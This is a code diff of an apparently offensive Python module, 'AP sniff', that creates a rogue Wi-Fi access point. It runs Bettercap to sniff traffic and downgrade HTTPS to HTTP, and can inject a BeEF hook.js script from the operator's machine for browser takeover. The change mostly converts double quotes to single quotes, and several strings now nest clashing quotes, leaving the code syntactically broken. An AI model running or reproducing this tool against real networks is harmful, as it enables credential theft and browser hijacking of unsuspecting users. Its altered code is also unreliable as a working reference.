@@ -9,23 +9,22 @@ import configparser
 import os                   # Running bettercap
 from time import sleep      # Just counting down before launch
 try:
-    from core.colors import bc as bc
-    import core.modules as cmodules
+    import core.core as core
     import core.commands as comm
+    import core.modules as cmodules
+    from core.colors import bc as bc
 except:
     import sys
     sys.path.append('././')
-    from core.colors import bc as bc
-    import core.modules as cmodules
+    import core.core as core
     import core.commands as comm
+    import core.modules as cmodules
+    from core.colors import bc as bc
 # END LIBRARIES
 
 
-config = configparser.ConfigParser()
-config.read('core/config.ini')
-
-
 # VARIABLES
+config = core.config()
 BETTERCAP = (config['TOOLS']['BETTERCAP_SYM'])
 CREATEAP = (config['TOOLS']['CREATEAP_SYM'])
 BEEF = (config['TOOLS']['BEEF_SYM'])
@@ -36,17 +35,17 @@ INTERFACE_MON = (config['NETWORK']['INTERFACE_MON'])
 
 # OPTIONS
 class options():
-    Author = "Thomas TJ (TTJ)"
+    Author = 'Thomas TJ (TTJ)'
     Name = 'AP sniff'
     Call = 'apsniff'
-    Modulename = "aut_ap_sniff"
+    Modulename = 'aut_ap_sniff'
     Category = 'sniff'
     Type = 'aut'
-    Version = "0.1"
-    License = "MIT"
-    Description = "Create AP and sniff HTTPS and avoid HSTS + Beef"
-    Datecreation = "30/11/2016"
-    Lastmodified = "30/11/2016"
+    Version = '0.1'
+    License = 'MIT'
+    Description = 'Create AP and sniff HTTPS and avoid HSTS + Beef'
+    Datecreation = '2017/01/01'
+    Lastmodified = '2017/01/01'
 
     def __init__(self, interface_n, interface_s, gateway, sniffer, proxy, target, sniff_log, ap_name, ap_log, args_ap, args_sniff, beef):
         self.interface_n = interface_n
@@ -70,39 +69,38 @@ class options():
     # Show options
     def show_opt(self):
         print(
-            ""
-            + "\n\t" + bc.OKBLUE + ("%-*s %-*s %-*s %s" % (15, "OPTION", 6, "RQ", 15, "VALUE", "DESCRIPTION")) + bc.ENDC
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "------", 6, "--", 15, "-----", "-----------"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "interface_n:", 6, "y", 15, self.interface_n, 'Active interface for net-connection (normally cable/wifi)'))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "interface_s:", 6, "y", 15, self.interface_s, 'Interface for wifi (needs to able to goto monitor mode)'))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "gateway:", 6, "y", 15, self.gateway, 'Gateway, e.g. 192.168.1.1'))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "sniffer:", 6, "n", 15, self.sniffer, "Activate sniffer - why not? (y/n)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "proxy:", 6, "n", 15, self.proxy, "Downgrade HTTPS to HTTP for sniffing (y/n)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "target:", 6, "n", 15, self.target, "Target IPs. Separate with ',' or subnet xx\\24"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "sniff_log:", 6, "n", 15, self.sniff_log, "Logfile for sniffed packets"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "ap_name:", 6, "n", 15, self.ap_name, "Name for AP (accesspoint)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "ap_log:", 6, "n", 15, self.ap_log, "Logfile for AP (accesspoint)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "beef:", 6, "n", 15, self.beef, "Inject BEEF for browser takeover (y/n)"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "args_ap:", 6, "n", 15, self.args_ap, "Free arguments for create_ap"))
-            + "\n\t" + ("%-*s %-*s %-*s %s" % (15, "args_sniff:", 6, "n", 15, self.args_sniff, "Free arguments for Bettercap"))
-            + "\n"
+            ''
+            + '\n\t' + bc.OKBLUE + ('%-*s %-*s %-*s %s' % (15, 'OPTION', 6, 'RQ', 15, 'VALUE', 'DESCRIPTION')) + bc.ENDC
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, '------', 6, '--', 15, '-----', '-----------'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_n:', 6, 'y', 15, self.interface_n, 'Active interface for net-connection (normally cable/wifi)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'interface_s:', 6, 'y', 15, self.interface_s, 'Interface for wifi (needs to able to goto monitor mode)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'gateway:', 6, 'y', 15, self.gateway, 'Gateway, e.g. 192.168.1.1'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniffer:', 6, 'n', 15, self.sniffer, 'Activate sniffer - why not? (y/n)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'proxy:', 6, 'n', 15, self.proxy, 'Downgrade HTTPS to HTTP for sniffing (y/n)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'target:', 6, 'n', 15, self.target, 'Target IPs. Separate with ',' or subnet xx\\24'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'sniff_log:', 6, 'n', 15, self.sniff_log, 'Logfile for sniffed packets'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_name:', 6, 'n', 15, self.ap_name, 'Name for AP (accesspoint)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'ap_log:', 6, 'n', 15, self.ap_log, 'Logfile for AP (accesspoint)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'beef:', 6, 'n', 15, self.beef, 'Inject BEEF for browser takeover (y/n)'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_ap:', 6, 'n', 15, self.args_ap, 'Free arguments for create_ap'))
+            + '\n\t' + ('%-*s %-*s %-*s %s' % (15, 'args_sniff:', 6, 'n', 15, self.args_sniff, 'Free arguments for Bettercap'))
+            + '\n'
             )
 
     # Show commands
     def show_commands(self):
         print(
-            ""
-            + "\n\t" + bc.OKBLUE + "COMMANDS:" + bc.ENDC
-            + "\n\t" + "---------"
-            + "\n\t" + ("%-*s ->\t%s" % (9, "run", "Run the script"))
-            # + "\n\t" + ("%-*s ->\t%s" % (9, "runcom", "Run program with specific arguments"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "info", "Information"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "help", "Help"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "pd", "Predefined arguments for 'runcom'"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "so", "Show options"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "sa", "Show module info"))
-            + "\n\t" + ("%-*s ->\t%s" % (9, "exit", "Exit"))
-            + "\n"
+            ''
+            + '\n\t' + bc.OKBLUE + 'COMMANDS:' + bc.ENDC
+            + '\n\t' + '---------'
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'run', 'Run the script'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'info', 'Information'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'help', 'Help'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'pd', 'Predefined arguments for 'runcom''))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'so', 'Show options'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'sa', 'Show module info'))
+            + '\n\t' + ('%-*s ->\t%s' % (9, 'exit', 'Exit'))
+            + '\n'
             )
 
     # Show all info
@@ -136,11 +134,11 @@ def run():
         command += '>> logs/' + sop.ap_log
 
     print(
-        "\n"
-        + "\t" + "Loading     : Create_ap"
-        + "\n\t" + "Command     : " + bc.BOLD + command + bc.ENDC
-        + "\n\t" + "Starting in : 2 seconds"
-        + "\n\t"
+        '\n'
+        + '\t' + 'Loading     : Create_ap'
+        + '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC
+        + '\n\t' + 'Starting in : 2 seconds'
+        + '\n\t'
         )
     sleep(2)
     comm.runCommand(command, 'Create_AP_with_create_ap')
@@ -148,12 +146,12 @@ def run():
     if sop.beef == 'y':
         comm.runCommand3('beef', 'Start_beef')
         local_ip = comm.getLocalIP(sop.interface_n)
-        print('\t[!]  Check the beef window and insert path to "hook.js"')
-        print('\t[!]  Press enter to select: "http://' + local_ip[0] + ':3000/hook.js"')
-        beef_js_path = input("\t->  " + bc.WARN + "wmd" + bc.ENDC + "@" + bc.WARN + "hook.js path:" + bc.ENDC + " ")
+        print('\t[!]  Check the beef window and insert path to 'hook.js'')
+        print('\t[!]  Press enter to select: \'http://' + local_ip[0] + ':3000/hook.js\'')
+        beef_js_path = input('\t->  ' + bc.WARN + 'wmd' + bc.ENDC + '@' + bc.WARN + 'hook.js path:' + bc.ENDC + ' ')
         if not beef_js_path:
             beef_js_path = 'http://' + local_ip[0] + ':3000/hook.js'
-        bettercap_beef_arg = '--proxy-module injectjs --js-url "' + beef_js_path + '" '
+        bettercap_beef_arg = '--proxy-module injectjs --js-url ' + beef_js_path + ' '
 
     # Start bettercap
     if getattr(sop, 'interface_n'):
@@ -182,24 +180,24 @@ def run():
 
     command = (BETTERCAP + ' ' + opt_com)
     print(
-        "\n"
-        + "\t" + "Loading     : Bettercap"
-        + "\n\t" + "Command     : " + bc.BOLD + command + bc.ENDC
-        + "\n\t" + "Starting in : 2 seconds"
-        + "\n\t"
+        '\n'
+        + '\t' + 'Loading     : Bettercap'
+        + '\n\t' + 'Command     : ' + bc.BOLD + command + bc.ENDC
+        + '\n\t' + 'Starting in : 2 seconds'
+        + '\n\t'
         )
     sleep(2)
     comm.runCommand2(command, 'Bettercap_sniff')
 
     print(
-        "\n"
-        + "\t" + "Status\t : Running"
-        + "\n\t" + "Stop\t : Manually close X"
+        '\n'
+        + '\t' + 'Status\t : Running'
+        + '\n\t' + 'Stop\t : Manually close X'
         + '\n'
-        + "\n\t" + 'Type "back" to return to the main menu'
-        + "\n"
+        + '\n\t' + 'Type 'back' to return to the main menu'
+        + '\n'
         )
-    print("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "APsniff:" + bc.ENDC + " Module is RUNNING")
+    print('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'APsniff:' + bc.ENDC + ' Module is RUNNING')
 # END BETTERCAP
 
 
@@ -217,7 +215,7 @@ def info():
 
 # CONSOLE
 def console():
-    value = input("   -> " + bc.FAIL + "wmd" + bc.ENDC + "@" + bc.FAIL + "APsniff:" + bc.ENDC + " ")
+    value = input('   -> ' + bc.FAIL + 'wmd' + bc.ENDC + '@' + bc.FAIL + 'APsniff:' + bc.ENDC + ' ')
     userinput = value.split()
     if 'so' in userinput[:1]:
         sop.show_opt()
@@ -245,15 +243,15 @@ def console():
         useroption = str(userinput[1:2]).strip('[]\'')
         uservalue = str(userinput[2:3]).strip('[]\'')
         if useroption not in sop.poss_opt():
-            print(bc.WARN + "\n    Error, no options for: " + useroption + "\n" + bc.ENDC)
+            print(bc.WARN + '\n    Error, no options for: ' + useroption + '\n' + bc.ENDC)
         elif useroption in sop.poss_opt():
             setattr(sop, useroption, uservalue)
-            print('\n      ' + useroption + '\t> ' + uservalue + "\n")
+            print('\n      ' + useroption + '\t> ' + uservalue + '\n')
     elif 'back' in userinput[:1] or 'exit' in userinput[:1]:
         return None
     else:
         command = str(userinput[:1]).strip('[]\'')
-        print(bc.WARN + "\n    Error, no options for: " + command + "\n" + bc.ENDC)
+        print(bc.WARN + '\n    Error, no options for: ' + command + '\n' + bc.ENDC)
     console()
 # END console
 
@@ -268,8 +266,8 @@ def main():
     print('\t/_/  |_/_/        /_/    /____/_/ /_/_/_/ /_/       ')
     print('\n')
     if os.getuid() != 0:
-        print("r00tness is needed due to packet sniffing!")
-        print("Run the script again as root/sudo")
+        print('r00tness is needed due to packet sniffing!')
+        print('Run the script again as root/sudo')
         return None
     print('\n')
     print('\t' + bc.OKBLUE + 'CHECKING REQUIREMENTS' + bc.ENDC)
